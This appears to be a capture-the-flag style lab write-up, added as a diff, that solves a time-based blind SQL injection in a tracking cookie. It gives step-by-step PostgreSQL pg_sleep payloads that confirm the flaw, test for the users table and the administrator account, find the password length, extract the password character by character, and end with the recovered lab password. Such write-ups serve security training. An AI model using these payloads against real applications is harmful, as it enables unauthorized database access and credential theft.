@@ -1,0 +1,53 @@
+Vulnerable parameter - tracking cookie
+
+Goals:
+1- Display the administrator password
+2- Login as the administrator user
+
+Analysis:
+--------
+
+Step #1: Confirm that the parameter is vulnerable to blind SQL injection
+' || (SELECT pg_sleep(10))--
+
+The parameter is vulnerable to blind SQL injection
+
+Step #2: Confirm that the users table exists in the database
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+
+The users table exists in the database
+
+Step #3: Confirm that the username administrator exists in the users table
+' || (SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+
+The username administrator exists in the users table
+
+Step #4: Determine the length of the administrator password
+' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+-> The length of the password is greater than 1
+
+' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 10) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+-> The length of the password is greater than 10
+
+' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 15) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+-> The length of the password is greater than 15
+
+' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 20) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+-> The length of the password is less than or equal to 20
+
+' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+-> The length of the password is 20 character
+
+Step #5: Display the administrator password
+' || (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
+
+Do this until you find all the character in the password
+
+note: You could use the Intruder from Burp Suite to do this or script it.
+
+Step #6: Login as the administrator user
+
+Username: administrator
+Password: 4y60qvq2zmijzcn40kjv
+
+Solved
